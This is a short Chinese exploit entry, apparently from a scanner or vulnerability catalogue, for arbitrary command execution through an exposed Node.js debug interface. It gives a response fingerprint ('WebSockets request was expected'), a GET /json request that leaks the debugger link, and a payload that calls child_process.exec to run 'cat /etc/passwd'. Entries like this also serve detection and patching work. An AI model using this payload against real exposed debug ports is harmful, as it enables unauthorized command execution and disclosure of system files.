# Node.js调试模式Json存在任意命令执行漏洞

Node ｜ 命令执行 ｜ —
- **指纹**：`body="WebSockets request was expected"`
- **请求**：`GET /json HTTP/1.1`

**Payload**
```
访问泄露的快捷链地址
执行
require("child_process").exec("cat /etc/passwd", (err,std) => console.log(std))
```
- **响应特征**：200